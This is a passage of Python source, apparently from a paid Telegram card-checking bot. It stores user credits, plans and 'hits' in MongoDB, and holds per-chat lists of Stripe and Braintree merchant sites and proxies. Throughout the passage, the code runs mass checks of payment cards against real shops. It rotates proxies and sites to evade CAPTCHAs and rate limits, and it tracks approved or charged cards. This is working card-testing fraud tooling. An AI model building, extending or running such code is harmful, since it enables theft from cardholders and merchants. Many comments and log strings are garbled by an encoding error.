        if DEBUG:
            print(f"[Mongo] Cannot register user {user_id}: DB not connected")
        return False
    try:
        now_iso = datetime.now(timezone.utc).isoformat()
        set_on_insert = {
            "credits": INITIAL_CREDITS,
            "registered_at": now_iso,
            "last_active": now_iso,
            "total_checks": 0,
            "total_hits": 0,
            "plan": None,
            "plan_expires": None,
        }
        if username:
            set_on_insert["username"] = username
        if first_name:
            set_on_insert["first_name"] = first_name
        result = coll.update_one(
            {"_id": user_id},
            {"$setOnInsert": set_on_insert},
            upsert=True,
        )
        newly_created = result.upserted_id is not None
        if newly_created:
            _invalidate_user_cache(user_id)
        if DEBUG:
            if newly_created:
                print(f"[Mongo] Ã¢Å“â€¦ Registered user {user_id} ({username or first_name or '?'}) with {INITIAL_CREDITS} credits")
            else:
                print(f"[Mongo] User {user_id} already registered")
        return newly_created
    except Exception as e:
        if DEBUG:
            print(f"[Mongo] Ã¢ÂÅ’ Register error for {user_id}: {e}")
            import traceback
            traceback.print_exc()
        return False


# Throttle update_user_activity to avoid excessive DB writes (once per 5 min per user)
_user_activity_last: dict = {}  # {user_id: epoch_seconds}
_USER_ACTIVITY_INTERVAL = 300  # 5 minutes
_USER_ACTIVITY_MAX_SIZE = 1000  # Max entries before cleanup

def update_user_activity(user_id, username=None, first_name=None):
    """Update last_active timestamp and username/first_name on every command (throttled: 1 write per 5 min)."""
    now = time.time()
    last = _user_activity_last.get(user_id, 0)
    if now - last < _USER_ACTIVITY_INTERVAL:
        return  # skip Ã¢â‚¬â€ updated recently
    _user_activity_last[user_id] = now
    # Prevent unbounded growth
    if len(_user_activity_last) > _USER_ACTIVITY_MAX_SIZE:
        stale = [k for k, v in _user_activity_last.items() if now - v > _USER_ACTIVITY_INTERVAL]
        for k in stale:
            _user_activity_last.pop(k, None)
    coll = _users_coll()
    if coll is None:
        return
    try:
        update = {"$set": {"last_active": datetime.now(timezone.utc).isoformat()}}
        if username:
            update["$set"]["username"] = username
        if first_name:
            update["$set"]["first_name"] = first_name
        coll.update_one({"_id": user_id}, update, upsert=False)
    except Exception:
        pass


def deduct_credits(user_id, amount):
    """Deduct credits. Returns True if successful (had enough). Plan users skip deduction."""
    # Plan users have unlimited credits
    if _user_has_active_plan(user_id):
        return True
    coll = _users_coll()
    if coll is None:
        if DEBUG:
            print(f"[Mongo] Cannot deduct credits for {user_id}: DB not connected")
        return False
    try:
        r = coll.find_one_and_update(
            {"_id": user_id, "credits": {"$gte": amount}},
            {"$inc": {"credits": -amount}},
            return_document=True,
        )
        if r is not None:
            _invalidate_user_cache(user_id)
            if DEBUG:
                new_balance = r.get("credits", 0)
                print(f"[Mongo] Ã¢Å“â€¦ Deducted {amount} credits from user {user_id}, new balance: {new_balance}")
        return r is not None
    except Exception as e:
        if DEBUG:
            print(f"[Mongo] Ã¢ÂÅ’ Deduct error for {user_id}: {e}")
        return False


def _user_has_active_plan(uid):
    """Check if user has an active (non-expired) plan. Uses cached data."""
    udata = _get_cached_user_data(uid)
    if not udata or not udata.get("plan"):
        return False
    expires = udata.get("plan_expires")
    if not expires:
        return False
    if isinstance(expires, str):
        try:
            expires = datetime.fromisoformat(expires)
        except (ValueError, TypeError):
            return False
    now = datetime.now(timezone.utc)
    if expires.tzinfo is None:
        expires = expires.replace(tzinfo=timezone.utc)
    return now < expires


def _get_user_plan_name(uid):
    """Return the plan name if active, else None."""
    udata = _get_cached_user_data(uid)
    if not udata or not udata.get("plan"):
        return None
    if _user_has_active_plan(uid):
        return udata["plan"]
    return None


def _set_user_plan(uid, plan_key, minutes=None, days=None):
    """Set a plan for a user in MongoDB. Accepts minutes or days. Returns True on success."""
    coll = _users_coll()
    if coll is None:
        return False
    if minutes:
        expires = datetime.now(timezone.utc) + timedelta(minutes=minutes)
    else:
        expires = datetime.now(timezone.utc) + timedelta(days=days or 30)
    try:
        coll.update_one(
            {"_id": uid},
            {"$set": {"plan": plan_key, "plan_expires": expires.isoformat()}},
        )
        _invalidate_user_cache(uid)
        return True
    except Exception:
        return False


def increment_total_checks(user_id, count=1):
    """Increment total_checks counter for user."""
    coll = _users_coll()
    if coll is None:
        if DEBUG:
            print(f"[Mongo] Cannot increment checks for {user_id}: DB not connected")
        return False
    try:
        coll.update_one(
            {"_id": user_id},
            {"$inc": {"total_checks": count}},
            upsert=False
        )
        _invalidate_user_cache(user_id)
        if DEBUG:
            print(f"[Mongo] Ã¢Å“â€¦ Incremented checks for user {user_id} by {count}")
        return True
    except Exception as e:
        if DEBUG:
            print(f"[Mongo] Ã¢ÂÅ’ Increment error for {user_id}: {e}")
        return False


def increment_total_hits(user_id, count=1):
    """Increment total_hits counter for user (Approved/Charged)."""
    coll = _users_coll()
    if coll is None:
        return False
    try:
        coll.update_one(
            {"_id": user_id},
            {"$inc": {"total_hits": count}},
            upsert=False
        )
        _invalidate_user_cache(user_id)
        if DEBUG:
            print(f"[Mongo] Ã¢Å“â€¦ Incremented hits for user {user_id} by {count}")
        return True
    except Exception as e:
        if DEBUG:
            print(f"[Mongo] Ã¢ÂÅ’ Hits increment error for {user_id}: {e}")
        return False

def _load_chat_from_mongo(chat_id):
    """Load sites and proxies for one chat from MongoDB into in-memory dicts."""
    db, coll = _get_mongo()
    if coll is None:
        return
    try:
        doc = coll.find_one({"_id": chat_id})
        if doc:
            if "sites" in doc and isinstance(doc["sites"], list):
                user_sites[chat_id] = doc["sites"]
            if "proxies" in doc and isinstance(doc["proxies"], list):
                user_proxies[chat_id] = doc["proxies"]
            if "bt_sites" in doc and isinstance(doc["bt_sites"], list):
                bt_user_sites[chat_id] = doc["bt_sites"]
    except Exception as e:
        if DEBUG:
            print(f"[Mongo] Load error for {chat_id}: {e}")

def _save_chat_to_mongo(chat_id):
    """Write current in-memory sites and proxies for chat_id to MongoDB."""
    db, coll = _get_mongo()
    if coll is None:
        if DEBUG:
            print(f"[Mongo] Cannot save chat {chat_id}: DB not connected")
        return
    try:
        result = coll.update_one(
            {"_id": chat_id},
            {"$set": {"sites": user_sites.get(chat_id, []), "proxies": user_proxies.get(chat_id, []), "bt_sites": bt_user_sites.get(chat_id, [])}},
            upsert=True,
        )
        if DEBUG:
            sites_count = len(user_sites.get(chat_id, []))
            proxies_count = len(user_proxies.get(chat_id, []))
            print(f"[Mongo] Ã¢Å“â€¦ Saved chat {chat_id}: {sites_count} sites, {proxies_count} proxies")
    except Exception as e:
        if DEBUG:
            print(f"[Mongo] Ã¢ÂÅ’ Save error for {chat_id}: {e}")

def _load_all_chats_from_mongo():
    """On startup: load all chats from MongoDB into user_sites / user_proxies."""
    db, coll = _get_mongo()
    if coll is None:
        return
    try:
        for doc in coll.find({}):
            cid = doc.get("_id")
            if cid is None:
                continue
            if "sites" in doc and isinstance(doc["sites"], list) and doc["sites"]:
                user_sites[cid] = doc["sites"]
            if "proxies" in doc and isinstance(doc["proxies"], list) and doc["proxies"]:
                user_proxies[cid] = doc["proxies"]
            if "bt_sites" in doc and isinstance(doc["bt_sites"], list) and doc["bt_sites"]:
                bt_user_sites[cid] = doc["bt_sites"]
    except Exception as e:
        if DEBUG:
            print(f"[Mongo] Load all error: {e}")


def reset_db():
    """Delete all documents in the chats collection and clear in-memory sites/proxies."""
    global user_sites, user_proxies
    deleted = 0
    db, coll = _get_mongo()
    if coll is not None:
        try:
            result = coll.delete_many({})
            deleted = result.deleted_count or 0
        except Exception as e:
            if DEBUG:
                print(f"[Mongo] reset_db error: {e}")
            deleted = -1
    user_sites.clear()
    user_proxies.clear()
    return deleted


def clear_db():
    """Clear all sites and proxies for all chats (keep chat documents, set empty lists)."""
    global user_sites, user_proxies
    db, coll = _get_mongo()
    if coll is not None:
        try:
            coll.update_many({}, {"$set": {"sites": [], "proxies": []}})
        except Exception as e:
            if DEBUG:
                print(f"[Mongo] clear_db error: {e}")
    # Always clear in-memory so bot state matches DB
    user_sites.clear()
    user_proxies.clear()


def sync_database():
    """
    Sync data from old database to current structure.
    This ensures all existing user data (credits, registration dates, checks) is preserved
    and merged with any new data structure we've added.
    Also cleans up invalid user IDs (non-numeric Telegram IDs).
    """
    db, coll = _get_mongo()
    if db is None:
        return {"success": False, "error": "Database not connected"}
    
    try:
        users_coll = db[MONGO_USERS_COLLECTION]
        chats_coll = db[MONGO_COLLECTION]
        
        # Sync users collection - ensure all users have required fields
        users_synced = 0
        invalid_users = 0
        
        for user_doc in users_coll.find({}):
            user_id = user_doc.get("_id")
            if user_id is None:
                continue
            
            # Check if user_id is a valid Telegram ID (must be an integer)
            # Old database might have MongoDB ObjectId strings
            if not isinstance(user_id, int):
                # Try to convert string to int
                try:
                    user_id_int = int(user_id)
                    # If successful, this was stored as string, skip it as invalid
                    invalid_users += 1
                    continue
                except (ValueError, TypeError):
                    # Not a valid Telegram user ID, mark for cleanup
                    invalid_users += 1
                    continue
            
            # Ensure all required fields exist
            update_fields = {}
            
            # Add credits if missing
            if "credits" not in user_doc:
                update_fields["credits"] = INITIAL_CREDITS
            
            # Add registered_at if missing
            if "registered_at" not in user_doc:
                update_fields["registered_at"] = datetime.now(timezone.utc).isoformat()
            
            # Add total_checks if missing
            if "total_checks" not in user_doc:
                update_fields["total_checks"] = 0
            
            # Add total_hits if missing
            if "total_hits" not in user_doc:
                update_fields["total_hits"] = 0
            
            # Add plan fields if missing
            if "plan" not in user_doc:
                update_fields["plan"] = None
            if "plan_expires" not in user_doc:
                update_fields["plan_expires"] = None
            
            # Update if needed
            if update_fields:
                users_coll.update_one(
                    {"_id": user_id},
                    {"$set": update_fields}
                )
                users_synced += 1
        
        # Sync chats collection - ensure all chats have sites and proxies arrays
        chats_synced = 0
        for chat_doc in chats_coll.find({}):
            chat_id = chat_doc.get("_id")
            if chat_id is None:
                continue
            
            update_fields = {}
            
            # Ensure sites array exists
            if "sites" not in chat_doc:
                update_fields["sites"] = []
            
            # Ensure proxies array exists
            if "proxies" not in chat_doc:
                update_fields["proxies"] = []
            
            # Update if needed
            if update_fields:
                chats_coll.update_one(
                    {"_id": chat_id},
                    {"$set": update_fields}
                )
                chats_synced += 1
        
        # Reload all data into memory
        _load_all_chats_from_mongo()
        
        # Count valid users (integer IDs only)
        valid_users = users_coll.count_documents({"_id": {"$type": ["int", "long"]}})
        
        result = {
            "success": True,
            "users_synced": users_synced,
            "chats_synced": chats_synced,
            "total_users": valid_users,
            "total_chats": chats_coll.count_documents({}),
            "invalid_users": invalid_users
        }
        
        if invalid_users > 0:
            result["warning"] = f"{invalid_users} invalid user IDs found (not Telegram IDs)"
        
        return result
    
    except Exception as e:
        if DEBUG:
            print(f"[Mongo] sync_database error: {e}")
        return {"success": False, "error": str(e)}


# Per-chat storage: sites list, proxies list, pending for next message
import threading as _threading
_data_lock = _threading.Lock()    # general data lock
_proxy_lock = _threading.Lock()   # proxy health tracking (separate to reduce contention)
_dedup_lock = _threading.Lock()   # card dedup tracking (separate to reduce contention)
_tg_send_lock = _threading.Lock() # serialize Telegram sends to avoid 429
user_sites = {}
user_proxies = {}
bt_user_sites = {}   # Braintree WooCommerce sites
pending_sites = {}   # {cid: timestamp}
pending_proxies = {} # {cid: timestamp}
pending_msh = {}     # {cid: timestamp}
pending_mbt = {}     # {cid: timestamp}  Ã¢â‚¬â€œ mass Braintree check
pending_mst = {}     # {cid: timestamp}  Ã¢â‚¬â€œ mass Stripe Charge check
pending_bt_sites = {} # {cid: timestamp} Ã¢â‚¬â€œ waiting for BT site URLs
pending_ac_link = {} # {cid: timestamp}  Ã¢â‚¬â€œ waiting for Stripe Checkout URL
pending_ac_cards = {} # {cid: {pk, client_secret, pi_id, mode, amount, currency, product, ts}}
_stop_flags = {}     # {cid: True} Ã¢â‚¬â€œ set by /stop to abort running checks

# Ã¢â€â‚¬Ã¢â€â‚¬ Background thread pool for non-critical I/O (webhooks, notifications) Ã¢â€â‚¬Ã¢â€â‚¬
_bg_pool = ThreadPoolExecutor(max_workers=8, thread_name_prefix="bg")

def _bg_fire(fn, *args, **kwargs):
    """Fire-and-forget: run fn in background pool. Never blocks caller."""
    try:
        _bg_pool.submit(fn, *args, **kwargs)
    except Exception:
        pass

# Ã¢â€â‚¬Ã¢â€â‚¬ Persistent aiohttp session functions (connection pooling) Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬
# Note: _aio_session and _aio_session_lock declared earlier before _DiscordConsoleMirror

def _get_aio_session():
    """Get or create a persistent aiohttp ClientSession on the shared loop."""
    global _aio_session
    if _aio_session is not None and not _aio_session.closed:
        return _aio_session
    with _aio_session_lock:
        if _aio_session is not None and not _aio_session.closed:
            return _aio_session
        import aiohttp
        connector = aiohttp.TCPConnector(limit=20, ttl_dns_cache=300, keepalive_timeout=30)
        timeout = aiohttp.ClientTimeout(total=10, connect=5)
        _aio_session = asyncio.run_coroutine_threadsafe(
            _create_aio_session(connector, timeout), _shared_loop
        ).result(timeout=10)
        return _aio_session

async def _create_aio_session(connector, timeout):
    import aiohttp
    return aiohttp.ClientSession(connector=connector, timeout=timeout)

async def _aio_post_json(url, data):
    """POST JSON via persistent aiohttp session."""
    try:
        session = _get_aio_session()
        async with session.post(url, json=data) as resp:
            return resp.status
    except Exception as e:
        print(f"[aiohttp] Ã¢Å¡Â Ã¯Â¸Â POST failed: {e}")
        return None

def _aio_post_sync(url, data):
    """Synchronous wrapper: POST JSON via aiohttp on the shared event loop."""
    try:
        fut = asyncio.run_coroutine_threadsafe(_aio_post_json(url, data), _shared_loop)
        fut.result(timeout=12)
    except Exception:
        pass
_PENDING_TTL = 180   # seconds Ã¢â‚¬â€œ auto-expire pending states after 3 min

# Ã¢â€â‚¬Ã¢â€â‚¬ Active mass check tracking (for dynamic worker scaling) Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬
_active_mass_checks = 0   # how many /msh are currently running
_mass_check_stop_flag = False  # global flag to stop all checks
_mass_count_lock = threading.Lock()

def _get_mass_workers(total_cards, num_sites=1):
    """Calculate optimal workers for this mass check based on current load AND site count.
    With few sites, cap workers to avoid rate-limiting a single shop."""
    with _mass_count_lock:
        active = _active_mass_checks
    if active <= 1:
        base = min(15, total_cards)   # solo user: fast speed
    elif active <= 3:
        base = min(10, total_cards)   # 2-3 concurrent: good speed
    elif active <= 5:
        base = min(8, total_cards)    # 4-5 concurrent: moderate
    else:
        base = min(5, total_cards)    # 6+: conservative
    # Cap by site count Ã¢â‚¬â€ prevent hammering a single site with too many workers
    # 1 site = max 8 workers, 2 sites = max 12, 3+ = max 15
    site_cap = min(15, max(8, num_sites * 6))
    return min(base, site_cap)

# Ã¢â€â‚¬Ã¢â€â‚¬ Proxy health tracking Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬
_proxy_fails = {}   # {proxy_url: fail_count}
_proxy_captcha = {} # {proxy_url: last_captcha_ts}
_proxy_success = {} # {proxy_url: success_count} - NEW
_PROXY_MAX_FAILS = 3          # fewer strikes before quarantine
_PROXY_CAPTCHA_COOLDOWN = 600  # 10 min cooldown after CAPTCHA (was 5 min)

def _pick_proxy(proxies):
    """Pick a proxy, avoiding ones with too many failures or recent CAPTCHA.
    Prefers proxies with higher success rates."""
    if not proxies:
        return None
    with _proxy_lock:
        now = time.time()
        healthy = [
            p for p in proxies
            if _proxy_fails.get(p, 0) < _PROXY_MAX_FAILS
            and now - _proxy_captcha.get(p, 0) > _PROXY_CAPTCHA_COOLDOWN
        ]
        if not healthy:
            # All proxies exhausted Ã¢â‚¬â€ reset counters and use any
            _proxy_fails.clear()
            _proxy_captcha.clear()
            _proxy_success.clear()
            healthy = proxies
        
        # Prefer proxies with higher success rates
        if len(healthy) > 1:
            # Sort by success rate (success / (success + fails))
            def _proxy_score(p):
                succ = _proxy_success.get(p, 0)
                fails = _proxy_fails.get(p, 0)
                total = succ + fails
                if total == 0:
                    return 0.5  # neutral score for untested proxies
                return succ / total
            
            # Pick from top 50% performers
            sorted_proxies = sorted(healthy, key=_proxy_score, reverse=True)
            top_half = sorted_proxies[:max(1, len(sorted_proxies) // 2)]
            return random.choice(top_half)
    
    return random.choice(healthy)

def _record_proxy_result(proxy_url, result):
    """Update proxy health based on check result."""
    if not proxy_url:
        return
    with _proxy_lock:
        code = str((result or {}).get("error_code", "")).upper()
        msg = str((result or {}).get("message", "")).upper()
        gateway = str((result or {}).get("gateway_message", "")).upper()
        # Detect CAPTCHA from any of the result fields
        is_captcha = "CAPTCHA" in code or "CAPTCHA" in msg or "CAPTCHA" in gateway or "CHECKPOINT" in code or "CHECKPOINT" in msg
        if is_captcha:
            _proxy_captcha[proxy_url] = time.time()
            _proxy_fails[proxy_url] = _proxy_fails.get(proxy_url, 0) + 2  # double penalty for CAPTCHA
        elif (result or {}).get("status") == "Error":
            _proxy_fails[proxy_url] = _proxy_fails.get(proxy_url, 0) + 1
        else:
            # Good result Ã¢â‚¬â€ increment success counter and reset fail counter
            _proxy_success[proxy_url] = _proxy_success.get(proxy_url, 0) + 1
            _proxy_fails.pop(proxy_url, None)
        # Auto-remove proxy after 10 consecutive failures
        if _proxy_fails.get(proxy_url, 0) >= 10:
            for cid_key in list(user_proxies.keys()):
                if proxy_url in user_proxies.get(cid_key, []):
                    user_proxies[cid_key] = [p for p in user_proxies[cid_key] if p != proxy_url]
                    _save_chat_to_mongo(cid_key)
            log.warning('Proxy', f'Auto-removed dead proxy: {proxy_url[:30]}...')
            _proxy_fails.pop(proxy_url, None)

# Ã¢â€â‚¬Ã¢â€â‚¬ Site health tracking Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬
_site_fails = {}    # {site_url: fail_count}
_site_captcha = {}  # {site_url: captcha_count}
_site_success = {}  # {site_url: success_count}
_site_last_check = {}  # {site_url: last_check_timestamp}
_SITE_MAX_FAILS = 5  # Max consecutive fails before site is deprioritized
_SITE_CAPTCHA_THRESHOLD = 3  # Max CAPTCHAs before cooldown
_SITE_CAPTCHA_COOLDOWN = 300  # 5 min cooldown after too many CAPTCHAs

def _pick_site_smart(sites):
    """Pick a site intelligently based on health metrics."""
    if not sites:
        return None
    if len(sites) == 1:
        return sites[0]
    
    with _proxy_lock:
        now = time.time()
        
        # Filter out sites with too many recent CAPTCHAs
        healthy = []
        for site in sites:
            captcha_count = _site_captcha.get(site, 0)
            last_check = _site_last_check.get(site, 0)
            time_since_check = now - last_check
            
            # Reset CAPTCHA counter if enough time has passed
            if time_since_check > _SITE_CAPTCHA_COOLDOWN:
                _site_captcha[site] = 0
                captcha_count = 0
            
            if captcha_count < _SITE_CAPTCHA_THRESHOLD:
                healthy.append(site)
        
        if not healthy:
            # All sites have CAPTCHAs - reset and use all
            _site_captcha.clear()
            healthy = sites
        
        # Score sites by success rate and recency
        def _site_score(site):
            succ = _site_success.get(site, 0)
            fails = _site_fails.get(site, 0)
            total = succ + fails
            
            if total == 0:
                return 0.5  # neutral score for untested sites
            
            success_rate = succ / total
            
            # Bonus for recently successful sites
            last_check = _site_last_check.get(site, 0)
            recency_bonus = 0.1 if (now - last_check) < 60 else 0
            
            return success_rate + recency_bonus
        
        # Pick from top performers
        sorted_sites = sorted(healthy, key=_site_score, reverse=True)
        top_third = sorted_sites[:max(1, len(sorted_sites) // 3)]
        return random.choice(top_third)

def _record_site_result(site_url, result):
    """Update site health based on check result."""
    if not site_url:
        return
    with _proxy_lock:
        _site_last_check[site_url] = time.time()
        
        code = str((result or {}).get("error_code", "")).upper()
        msg = str((result or {}).get("message", "")).upper()
        
        is_captcha = "CAPTCHA" in code or "CAPTCHA" in msg or "CHECKPOINT" in code
        
        if is_captcha:
            _site_captcha[site_url] = _site_captcha.get(site_url, 0) + 1
            _site_fails[site_url] = _site_fails.get(site_url, 0) + 1
        elif (result or {}).get("status") == "Error":
            _site_fails[site_url] = _site_fails.get(site_url, 0) + 1
        else:
            # Success - increment counter and reset fails
            _site_success[site_url] = _site_success.get(site_url, 0) + 1
            _site_fails.pop(site_url, None)

# Ã¢â€â‚¬Ã¢â€â‚¬ Advanced rate limiting Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬
_site_rate_limit = {}  # {site_url: {"last_check": timestamp, "checks_in_window": count}}
_RATE_LIMIT_WINDOW = 60  # 1 minute window
_RATE_LIMIT_MAX_CHECKS = 20  # Max checks per site per minute

def _check_rate_limit(site_url):
    """Check if we should delay before checking this site (returns delay in seconds)."""
    if not site_url:
        return 0
    
    with _proxy_lock:
        now = time.time()
        
        if site_url not in _site_rate_limit:
            _site_rate_limit[site_url] = {"last_check": now, "checks_in_window": 1, "window_start": now}
            return 0
        
        site_data = _site_rate_limit[site_url]
        window_start = site_data.get("window_start", now)
        checks_in_window = site_data.get("checks_in_window", 0)
        
        # Reset window if expired
        if now - window_start > _RATE_LIMIT_WINDOW:
            site_data["window_start"] = now
            site_data["checks_in_window"] = 1
            site_data["last_check"] = now
            return 0
        
        # Check if we're over the limit
        if checks_in_window >= _RATE_LIMIT_MAX_CHECKS:
            # Calculate delay needed
            time_until_reset = _RATE_LIMIT_WINDOW - (now - window_start)
            return max(0, time_until_reset)
        
        # Increment counter
        site_data["checks_in_window"] += 1
        site_data["last_check"] = now
        
        # Adaptive delay based on CAPTCHA frequency
        captcha_count = _site_captcha.get(site_url, 0)
        if captcha_count > 0:
            # Add small delay if site is showing CAPTCHAs
            return min(0.5 * captcha_count, 3.0)  # Max 3 second delay
        
        return 0

# Ã¢â€â‚¬Ã¢â€â‚¬ Round-robin site rotation Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬
# Ensures each consecutive CC check uses a different site instead of hammering
# the same one.  Thread-safe via itertools.count (atomic on CPython).
import itertools as _itertools
_site_rr_index = _itertools.count()    # global atomic counter

def _pick_site_rr(sites):
    """Pick the next site in round-robin order. Never returns None if sites is non-empty."""
    if not sites:
        return None
    idx = next(_site_rr_index) % len(sites)
    return sites[idx]


# Ã¢â€â‚¬Ã¢â€â‚¬ Sticky proxy selection Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬
# Prefer the last-used healthy proxy (no CAPTCHA) to avoid unnecessary rotation.
# If the current proxy gets CAPTCHA'd or fails, switch to the next healthy one.
_sticky_proxy = {}  # {thread_id: proxy_url}  Ã¢â‚¬â€œ per-worker sticky tracking

def _pick_proxy_sticky(proxies, force_new=False):
    """Pick a proxy: re-use the current one if healthy, otherwise rotate.
    Falls back to _pick_proxy() random selection when no sticky candidate."""
    if not proxies:
        return None
    tid = threading.current_thread().ident
    with _proxy_lock:
        current = _sticky_proxy.get(tid)
        if current and not force_new:
            now = time.time()
            fails = _proxy_fails.get(current, 0)
            captcha_ts = _proxy_captcha.get(current, 0)
            if fails < _PROXY_MAX_FAILS and now - captcha_ts > _PROXY_CAPTCHA_COOLDOWN:
                return current  # still healthy Ã¢â‚¬â€ keep using it
    # Current proxy is bad or we have none Ã¢â‚¬â€ pick a new healthy one
    new_proxy = _pick_proxy(proxies)
    with _proxy_lock:
        _sticky_proxy[tid] = new_proxy
    return new_proxy


# Ã¢â€â‚¬Ã¢â€â‚¬ Anti-duplicate card check (5 min window) Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬
_recent_checks = {}  # {card_str: timestamp}
_DEDUP_TTL = 300     # 5 minutes

_dedup_cleanup_counter = [0]

def _is_duplicate_card(card_str):
    """Return True if this card was checked in the last 5 minutes."""
    with _dedup_lock:
        now = time.time()
        # Cleanup old entries every 50 calls (not every call)
